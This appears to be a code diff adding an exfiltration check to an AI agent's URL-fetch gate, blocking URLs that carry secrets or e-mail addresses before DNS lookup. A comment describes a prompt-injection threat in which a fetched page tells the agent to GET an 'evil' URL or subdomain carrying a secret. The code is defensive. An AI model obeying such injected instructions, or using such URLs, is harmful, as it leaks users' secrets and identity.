@@ -131,6 +131,23 @@ def _check_secrets(query: str) -> str | None:
     return None
 
 
+_EMAIL_IN_URL = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
+
+
+def _check_url_leak(url: str) -> str | None:
+    """Return a reason if *url* carries a secret or an e-mail address, else None."""
+    from urllib.parse import unquote_plus
+
+    decoded = unquote_plus(unquote_plus(url))
+    for candidate in (url, decoded):
+        secret = _check_secrets(candidate)
+        if secret:
+            return "URL contains a secret pattern"
+        if _EMAIL_IN_URL.search(candidate):
+            return "URL contains an e-mail address"
+    return None
+
+
 def _is_ip_safe(ip_str: str) -> bool:
     """Check raw IP against blocklist."""
     try:
@@ -281,6 +298,17 @@ def gate_fetch(url: str, session_id: str = "") -> GateFetchResult | dict:
     if rl_err:
         _audit({"event": "fetch.rate_limited", "url": url}, session_id)
         return {"error": rl_err}
+
+    # Exfiltration check: a fetched page can tell the agent to GET
+    # https://evil/?d=<secret>. Same secret scan as gate_query, plus e-mail
+    # addresses (the user's identity, git authors) — run on the percent-decoded
+    # URL so %40 / %2D encodings don't slip through. Runs BEFORE DNS: a secret
+    # in a subdomain (<secret>.evil.com) would leak via the lookup itself.
+    leak = _check_url_leak(_sanitize_unicode(url))
+    if leak:
+        _audit({"event": "fetch.leak_blocked", "url_hash": _query_hash(url),
+                "reason": leak}, session_id)
+        return {"error": f"Fetch rejected: {leak}"}
 
     # URL validation + DNS resolution → pinned IP
     url_err, pinned_ip = _validate_url(url)
